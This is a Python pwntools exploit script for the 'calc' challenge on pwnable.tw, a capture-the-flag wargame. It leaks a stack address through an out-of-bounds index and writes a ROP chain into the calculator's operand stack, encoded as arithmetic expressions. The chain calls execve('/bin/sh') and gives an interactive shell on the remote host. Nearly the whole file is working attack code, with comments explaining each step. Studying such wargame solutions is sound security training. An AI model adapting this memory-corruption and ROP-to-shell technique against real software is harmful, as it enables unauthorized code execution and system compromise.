#!/usr/bin/env python3

from pwn import *

exe = ELF("./calc")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else: 
        r = remote("chall.pwnable.tw", 10100)

    return r


def add_bytes_to_payload_as_int_per_4bytes(payload, bytes):
    assert len(bytes)%4 == 0
    for i in range(0, len(bytes), 4):
        num = u32(bytes[i:i+4])
        if num < 0x80000000:
            if num == 0:
                payload += b'1*1-1+'
            else: 
                payload += str(num).encode() + b'*1+'
        else:
            # We need to make any number that would be negative when interpreted as a signed integer, not negative (since atoi() will round it down to 0x7fffffff, thus losing the information)
            # We do this by decomposing it to a multiplication of 2 numbers
            factor = 1
            divide_by = 2
            while num >= 0x80000000:
                if num % divide_by == 0:
                    num //= divide_by
                    factor *= divide_by
                else:
                    num += 1
            payload += str(num).encode() + b'*' + str(factor).encode() + b'+'
    return payload

def main():
    r = conn()

    ##### There is no need to leak the canary because we have arb-write into a contiguous mem seg per input #####
    # # Leak canary of the stack frame of `calc`
    # r.sendlineafter(b'===\n', b'+357')
    # canary = int(r.recvline().strip()) & 0xFFFFFFFF # Convert neg number to uint32_t
    # log.info(f"{hex(canary)=}")

    # Leak stack addr of where we inject the /bin/sh\x00 string
    r.sendlineafter(b'===\n', b'-6')
    binsh_addr = (int(r.recvline().strip()) & 0xFFFFFFFF) + 0x410 + 28 # Convert neg number to uint32_t and add fixed offset
    log.info(f"{hex(binsh_addr)=}")

    # This sets the operand stack size counter to 360 so that the next int is written to the 361-th element
    # We need to use "00" instead of "0" because a strcmp is done with number strings for 0, and if detected parse_expr exits without further parsing
    payload = b'360+00+'

    # Setup ROP chain - mostly automated
    rop = ROP(exe)
    rop(eax = 0xb, ebx = binsh_addr, ecx = 0x0, edx = 0x0)
    rop.raw(0x8049a21) # int 0x80 gadget
    rop.raw(u32(b'/bin'))
    rop.raw(u32(b'/sh\x00'))
    print(rop.dump())
    payload = add_bytes_to_payload_as_int_per_4bytes(payload, rop.chain())
    log.info(f"{payload=}")

    r.sendline(payload)
    r.sendline() # To end the while loop in calc so that it returns

    r.interactive()


if __name__ == "__main__":
    main()